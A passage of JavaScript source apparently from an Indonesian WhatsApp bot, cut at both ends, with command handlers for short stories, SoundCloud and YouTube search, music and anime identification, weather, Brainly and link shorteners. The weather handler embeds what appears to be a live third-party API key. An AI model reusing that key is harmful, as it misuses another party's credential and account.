let cerpe = await cerpen(`korea`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kristen':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`kristen`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-liburan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`liburan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-malaysia':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`malaysia`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-mengharukan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`mengharukan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-misteri':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`misteri`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-motivasi':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`motivasi`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasihat':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`nasihat`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasionalisme':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`nasionalisme`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-olahraga':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`olahraga`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-patahhati':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`patah hati`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penantian':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`penantian`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pendidikan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`pendidikan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengalaman':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`pengalaman pribadi`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengorbanan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`pengorbanan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penyesalan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`penyesalan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perjuangan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`perjuangan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perpisahan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`perpisahan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-persahabatan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`persahabatan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-petualangan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`petualangan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-ramadhan':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`ramadhan`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-remaja':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`remaja`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rindu':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`rindu`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rohani':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`rohani`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-romantis':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`romantis`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sastra':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`sastra`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sedih':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`sedih`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sejarah':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let cerpe = await cerpen(`sejarah`)
setReply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
//================================================================================\\
case 'scsearch':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan link')
let scdl = await SoundCloud.create()
let result = await scdl.search({
query: q,
limit: 15,
offset: 0,
filter: 'tracks',
})
let teks = `*SOUNDCLOUD SEARCH*`
for (let res of result.collection) {
teks += `

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration / 1000 / 60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
🌐 Url : ${res.permalink_url}

═════════════════
`
}
teks += `_Thanks for choosing SoundCloud_`
try {
let anuah = result.collection[0].artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch (err) {
let anuh = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU'
var yamiyami = await getBuffer(anuh)
}
let nano = [
{ buttonId: `${prefix}scmp3 ${result.collection[0].permalink_url} `, buttonText: { displayText: `ᴀᴜᴅɪᴏ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}scdoc ${result.collection[0].permalink_url}`, buttonText: { displayText: `ᴅᴏᴄᴜᴍᴇɴᴛ` }, type: 'RESPONSE' },
]
//Araa.Araa.sendButImage (from, teks, © ${fake1}, yamiyami, nano)
break
case 'scmp3':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan Link')
if (q.includes('social_sharing')) return setReply('Masukan link dengan benar')
let nana = q.replace('https://m.', 'https://')
setReply('*Downloading...*')
let scdl = await SoundCloud.create()
let track = await scdl.tracks.getTrack(nana)
let menit = Math.round(track.full_duration / 1000 / 60)
if (menit > 10) return setReply('Tidak bisa mendownload musik lebih dari 10 menit')
scdlMp3(nana)
}
break
case 'scdoc':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan Link')
if (q.includes('social_sharing')) return setReply('Masukan link dengan benar')
let nana = q.replace('https://m.', 'https://')
setReply('*Downloading...*')
let scdl = await SoundCloud.create()
let track = await scdl.tracks.getTrack(nana)
let menit = Math.round(track.full_duration / 1000 / 60)
if (menit > 10) return setReply('Tidak bisa mendownload musik lebih dari 10 menit')
scdlDoc(nana)
}
break
case 'ghstalk':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
let nana = await ghstalk(q)
console.log(nana)
let foto = nana.avatar_url
let gambar = await getBuffer(foto)
console.log(foto)
let toks = `
Nama: ${nana.name}
Bio: ${nana.bio}
Followers: ${nana.followers}
Following: ${nana.following}
Repository: ${nana.public_repos}
Created at: ${nana.created_at}
Update at: ${nana.updated_at}
Twitter: ${nana.twitter_username}
Email: ${nana.email}
Lokasi: ${nana.location}
Website: ${nana.blog}
Github url: ${nana.url}
`
console.log(toks)
await Araa.sendMessage(from, { image: gambar, caption: toks }, { quoted: m })
}
break
case 'lirik':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (args.length < 2) return reply(`Kirim perintah ${command} judul lagu`)
onlyWait()
ra.Musikmatch(q)
.then(async (data) => {
var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
Araa.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: m })
})
.catch(() => reply(`Judul lagu tidak ditemukan`))
}
break
case 'grupwa':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return reply(`Kirim perintah ${command} nama grup`)
onlyWait()
hxz.linkwa(q).then(async (data) => {
if (data.length == 0) return reply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
reply(teks)
})
.catch(() => reply(mess.error.api))
break
case 'yts':
try {
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Format salah')
onlyWait()
let rus = await yts(q)
let res = await rus.all.filter((v) => v.type == 'video')
let videoID = res[0].videoId
try {
var thumbnya = `https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch (err) {
var thumbnya = `https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let a = `*Youtube Search 🔎*\n`
for (let i of res) {
a += `
📜 Title : ${i.title}
📈 Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
let b = a.trim()

let imag = await getBuffer(res[0].image)
let mok = [
{ buttonId: `${prefix}playmp3 ${res[0].url} `, buttonText: { displayText: `ᴀᴜᴅɪᴏ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}playmp4 ${res[0].url}`, buttonText: { displayText: `ᴠɪᴅᴇᴏ` }, type: 'RESPONSE' },
]
Araa.sendButImage(from, b, `${fake}`, imag, mok, { quoted: m })
} catch (e) {
console.log(e)
setReply(`${e}`)
}
break
case 'whatmusic':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isQuotedAudio) {
onlyWait()
let media = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async (metadata) => {
if (metadata.status.msg == 'No result') return setReply('Music tidak di temukan')
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if (rus.all.length == '0') return setReply('Video tidak bisa di download')
let ras = await rus.all.filter((v) => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url)
let audio = ytdl.filterFormats(info.formats, 'audioonly')
let format = ytdl.chooseFormat(info.formats, { quality: '18' })
let videoID = ras[0].videoId
try {
var thumbnya = `https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch (err) {
var thumbnya = `https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{ buttonId: `${prefix}playmp3 ${ras[0].url} `, buttonText: { displayText: `ᴀᴜᴅɪᴏ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}playmp4 ${ras[0].url}`, buttonText: { displayText: `ᴠɪᴅɪᴏ` }, type: 'RESPONSE' },
]
let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map((v) => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map((v) => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
Araa.sendButImage(from, teks, fake, yamyam, aklo, { contextInfo: forward })
})
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
onlyWait()
let media = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async (metadata) => {
if (metadata.status.msg == 'No result') return setReply('Music tidak di temukan')
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if (rus.all.length == '0') return setReply('Video tidak bisa di download')
let ras = await rus.all.filter((v) => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url)
let audio = ytdl.filterFormats(info.formats, 'audioonly')
let format = ytdl.chooseFormat(info.formats, { quality: '18' })
let videoID = ras[0].videoId
try {
var thumbnya = `https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch (err) {
var thumbnya = `https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{ buttonId: `${prefix}playmp3 ${ras[0].url} `, buttonText: { displayText: `ᴀᴜᴅɪᴏ` }, type: 'RESPONSE' },
{ buttonId: `${prefix}playmp4 ${ras[0].url}`, buttonText: { displayText: `ᴠɪᴅɪᴏ` }, type: 'RESPONSE' },]
let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map((v) => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map((v) => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
Araa.sendButImage(from, teks, fake, yamyam, aklo, { contextInfo: forward })
})
fs.unlinkSync(ran)
})
} else {
setReply('Reply audio atau video')
}
break
case 'whatanime':{
const FormData = require('form-data')
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (isImage || isQuotedImage) {
let yoooo = await Araa.downloadAndSaveMediaMessage(quoted)
let bodyForm = new FormData()
bodyForm.append('image', fs.createReadStream(yoooo))
fetchJson('https://api.trace.moe/search', { method: 'POST', body: bodyForm })
.then(async (res) => {
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await Araa.sendMessage(from, { caption: teks, video: { url: res.result[0].video } }, { quoted: m })
})
.catch((err) => {
setReply(mess.error.api)
})
} else if (isSticker || isQuotedSticker) {
let yoooo = await Araa.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return setReply('Gagal :V')
let bodyForm = new FormData()
bodyForm.append('image', fs.createReadStream(ran))
fetchJson('https://api.trace.moe/search', { method: 'POST', body: bodyForm })
.then(async (res) => {
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await Araa.sendMessage(from, { caption: teks, video: { url: res.result[0].video } }, { quoted: m })
fs.unlinkSync(ran)
})
.catch((err) => {
setReply(mess.error.api)
})
})
} else {
setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
}
break
case 'google':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('masukan teks')
if (q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
let google = require('google-it')
google({'query': q}).then(res => {
let teks = `Google Search From : ${q}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
setReply(teks)
})
}
break
case 'kbbi':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (args.length < 1) return setReply('Apa yang mau dicari um?')
let asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, { method: 'get' })
setReply('Menurut Kbbi:\n\n' + asw.result)
}
break
case 'weather':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!args[0]) setReply(' please provide place or location name')
try {
let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
let res = await response
let name = res.data.name
let Country = res.data.sys.country
let Weather = res.data.weather[0].description
let Temperature = res.data.main.temp + '°C'
let Minimum_Temperature = res.data.main.temp_min + '°C'
let Maximum_Temperature = res.data.main.temp_max + '°C'
let Humidity = res.data.main.humidity + '%'
let Wind = res.data.wind.speed + 'km/h'
setReply(
`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`
)
} catch (e) {
setReply('Lokasi tidak di temukan, silakan masukan nama negara')
}
}
break
case 'kodepos':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
try {
let nana = await kodepos(q)
console.log(nana)
let teks = `Berikut Daftar kode pos\nYang telah di temukan\n\n`
for (let i of nana) {
teks += `Provinsi: ${i.province}\nKota: ${i.city}\nKecamatan: ${i.subdistrict}\nKabupanten: ${i.urban}\nKode Pos: ${i.postalcode}\n\n═════════════════\n\n`
}
setReply(teks)
} catch (err) {
setReply('Kodepos tidak di temukan')
console.log(err)
}
break
case 'kodebahasa':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
                        let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
setReply(LANGUAGES)
}
break
case 'brainly':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
const { Brainly } = require('brainly-scraper-v2')
const brainly = new Brainly('id')
if (!q) setReply('Soalnya?')
let nana = `https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
let foto = await getBuffer(nana)
let res = await brainly.searchWithMT(`${q}`, `id`)
console.log(res)
let teks = `_*BRAINLY*_\n\n`
teks += res.map(
({ question, answers }, i) => `
_*PERTANYAAN KE ${i + 1}*_
${question.content}${answers.map(
                                (v, i) => `

*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
${v.content}`
                            ).join``}`
                        ).join(`
═════════════════
`)
teks += `\n\n_Thanks for choosing Brainly_`
let mok = [
{ buttonId: `Thanks`, buttonText: { displayText: `ᴛʜᴀɴᴋs` }, type: 'RESPONSE' },
{ buttonId: `${prefix}donasi`, buttonText: { displayText: `ᴅᴏɴᴀsɪ` }, type: 'RESPONSE' },
]
Araa.sendButImage(from, teks, fake, foto, mok, { contextInfo: forward })
}
break
case 'wallpaper':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukkan Query Title')
let anu = await wallpaper(q)
if (anu.length == '0') return setReply('Image tidak di temukan')
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [{ buttonId: `wallpaper ${text}`, buttonText: { displayText: 'Next Image' }, type: 1 }]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: fake,
buttons: buttons,
headerType: 4,
}
Araa.sendMessage(from, buttonMessage, { quoted: m })
}
break
case 'quotes':
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
var data = await fetchJson(`https://megayaa.herokuapp.com/api/randomquote`)
setReply(data.result.quotes + '\n\n-- ' + data.result.author)
break
//================================================================================\\
case 'tinyurl':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (args.length < 1) return setReply(`Masukkan link`)
if (!isUrl) return setReply(`Masukkan link`)
const fetchText = (url, optiono) => {
return new Promise((resolve, reject) => {
return fetch(url, optiono)
.then((response) => response.text())
.then((text) => resolve(text))
.catch((err) => {
console.log(color(err, 'red'))
reject(err)
})
})
}
let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
let shorti = `*Result : ${okok}*`
setReply(shorti)
}
break
case 'bitly':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) return setReply('Masukan link')
if (!isUrl) return setReply('Masukan link dengan benar')
try {
let result = await bitly.shorten(q)
setReply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
} catch (e) {
setReply(`Url invalid`)
}
}
break
case 'cutly':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!q) setReply('url/link nya mana?')
let res = await fetch(`http://hadi-api.herokuapp.com/api/cuttly?url=${text}`)
let json = await res.json()
if (json.status) setReply(json.result)
else return setReply('Link Invalid!\nPeriksa url anda')
}
break
case 'tourl':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
onlyWait()
let { UploadFileUgu } = require('../lib/uploader')
let media = await Araa.downloadAndSaveMediaMessage(quoted)
if (isQuotedImage) {
let anu = await TelegraPh(media)
setReply(util.format(anu))
} else if (isQuotedVideo || isQuotedAudio || isQuotedSticker) {
let anu = await UploadFileUgu(media)
setReply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//================================================================================\\
case 'adderror':{
if (isGroup && !isSewa) return onlySewa()
if (isBanchat) return 
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
